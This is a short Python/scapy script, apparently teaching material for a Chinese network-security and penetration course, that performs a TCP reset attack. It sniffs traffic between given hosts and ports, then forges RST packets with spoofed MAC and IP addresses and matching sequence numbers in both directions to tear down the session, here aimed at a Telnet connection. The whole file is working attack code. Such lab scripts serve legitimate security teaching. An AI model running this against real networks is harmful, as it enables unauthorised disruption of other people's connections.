#!/usr/bin/python3.4
# -*- coding=utf-8 -*-
#本脚由亁颐堂现任明教教主编写，用于乾颐盾Python课程！
#教主QQ:605658506
#亁颐堂官网www.qytang.com
#乾颐盾是由亁颐堂现任明教教主开发的综合性安全课程
#包括传统网络安全（防火墙，IPS...）与Python语言和黑客渗透课程！

import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)#清除报错
from scapy.all import *

def tcp_monitor_callback(pkt):
	source_mac = pkt[Ether].fields['src']
	destination_mac = pkt[Ether].fields['dst']
	source_ip = pkt[IP].fields['src']
	destination_ip = pkt[IP].fields['dst']
	source_port = pkt[TCP].fields['sport']
	destination_port = pkt[TCP].fields['dport']
	seq_sn = pkt[TCP].fields['seq']
	ack_sn = pkt[TCP].fields['ack']

	a = Ether(src=source_mac, dst=destination_mac)/IP(src=source_ip,dst=destination_ip)/TCP(dport=destination_port,sport=source_port,flags=4,seq=seq_sn)
	b = Ether(src=destination_mac, dst=source_mac)/IP(src=destination_ip,dst=source_ip)/TCP(dport=source_port,sport=destination_port,flags=4,seq=ack_sn)
	sendp(a, iface='eno33554944', verbose=False)
	sendp(b, iface='eno33554944', verbose=False)
	
def tcp_reset(src_ip, dst_ip, dst_port, src_port = None):

	if src_port == None:
		match = "src host " + src_ip + " and dst host " + dst_ip + " and dst port " + dst_port
	else:
		match = "src host " + src_ip + " and dst host " + dst_ip + " and src port " + src_port + " and dst port " + dst_port
	print(match)
	sniff(prn=tcp_monitor_callback, filter=match, store=0, iface='eno33554944')

if __name__ == "__main__":
	tcp_reset('202.100.1.2', '202.100.1.1', '23')